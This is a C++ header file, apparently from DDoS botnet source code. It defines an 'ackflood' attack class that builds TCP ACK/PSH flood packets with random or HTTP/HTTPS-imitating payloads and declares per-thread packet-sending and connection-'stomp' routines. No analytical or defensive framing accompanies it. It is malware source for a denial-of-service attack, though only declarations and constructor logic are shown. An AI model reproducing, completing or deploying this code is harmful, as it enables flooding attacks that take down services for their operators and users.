#ifndef _TCP_ACK_ATK_H
#define _TCP_ACK_ATK_H

#include "pktbuild.h"

struct attack_stomp_data {
	int fd;
    uint32_t daddr, saddr;
    uint32_t seq, ack_seq;
    uint16_t sport, dport;
};

class CTcpAckAtk : public CAttack {
public:
	CTcpAckAtk():CAttack()
	{
		strncpy(m_name, "ackflood", 31);
		m_stomp_cnt = 0; 
		m_cur_stomp_pos = 0;
		memset(m_stomp_data, 0, sizeof(m_stomp_data));
		m_params.m_iph_proto = IPPROTO_TCP;
	}
	
	CTcpAckAtk(const CDDoSParam& param) :CAttack(param){

		strncpy(m_name, "ackflood", 31);
		m_stomp_cnt = 0; 
		m_cur_stomp_pos = 0;
		memset(m_stomp_data, 0, sizeof(m_stomp_data));	
		
			
		if(m_params.m_http_action == 0 ||m_params.m_http_action == 1){
			m_params.m_tcpflag=0x18;// ack push
		    m_params.m_tcpoptionflag=0;
			if(m_params.m_payload_data == NULL){
				deafult_http_params();
			}
		}
		if(m_params.m_https_action == 0 ||m_params.m_https_action == 1){
			m_params.m_tcpflag=0x18;// ack push
		    m_params.m_tcpoptionflag=1;	//启动默认的
			if(m_params.m_payload_data == NULL){
				deafult_https_params();
			}
		}
		
		if(m_params.m_payload_len==0 && m_params.m_payload_data ==NULL){
			m_params.m_payload_len = 16;
			char ss[17];
			rand_str(ss,m_params.m_payload_len);
			m_params.set_payload_data(ss, m_params.m_payload_len);
		}
		
        if(m_params.m_tcpoptionflag==1){
            deafult_tcp_options();
		}

		m_params.m_iph_proto = IPPROTO_TCP;
	}

	virtual ~CTcpAckAtk()
	{
	}
	
	bool check_params();

	int32_t start();
	void stop();

	int32_t attack_one_pkt(int thrd_index);
	

private:
	struct attack_stomp_data* get_cur_stomp_data();
	int32_t tcp_stomp_init(uint32_t dstaddr, uint16_t dport, struct attack_stomp_data *stomp_data);
	int32_t tcp_bot_init(uint32_t dstaddr, uint16_t dport, struct attack_stomp_data *stomp_data);
	bool get_layer3_info(pdu_l3_desc_t & layer3);

private:
	uint32_t m_cur_stomp_pos;
	uint32_t m_stomp_cnt;
	struct attack_stomp_data *m_stomp_data[MAX_CONCUR_CNT];
	void deafult_https_params();
	void deafult_http_params();
	void deafult_tcp_options();
protected:
	uint32_t modify_tcp_ack(pdu_l3_desc_t *pdu_desc, char *buffer, uint32_t buffer_len, char* payload);

};

#endif

